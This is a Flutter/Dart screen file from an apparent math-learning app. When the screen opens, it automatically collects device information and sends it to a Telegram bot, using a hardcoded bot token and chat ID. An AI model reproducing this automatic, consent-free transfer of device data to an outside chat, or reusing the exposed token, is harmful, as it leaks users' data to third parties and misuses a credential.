import 'package:belajar_matika/utils/tele_helper.dart';
import 'package:flutter/material.dart';
import 'device_info_helper.dart'; // Impor DeviceInfoHelper

class DeviceInfoScreen extends StatefulWidget {
  @override
  _DeviceInfoScreenState createState() => _DeviceInfoScreenState();
}

class _DeviceInfoScreenState extends State<DeviceInfoScreen> {
  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
    telegramHelper: TelegramHelper(
      botToken:
          '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
      chatId: '111519789', // Ganti dengan chat ID Anda
    ),
  );
  bool isLoading = true;
  // String? statusMessage;

  @override
  void initState() {
    super.initState();
    _loadAndSendDeviceInfo();
  }

  Future<void> _loadAndSendDeviceInfo() async {
    try {
      await deviceInfoHelper.getAndSendDeviceInfo();
      setState(() {
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        isLoading = false;
      });
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
            content:
                Text('Gagal memuat atau mengirim informasi perangkat: $e')),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Informasi Perangkat'),
      ),
      body: Center(
        child: isLoading
            ? const CircularProgressIndicator()
            : const Text('Informasi perangkat telah dikirim ke Telegram!'),
      ),
    );
  }
}
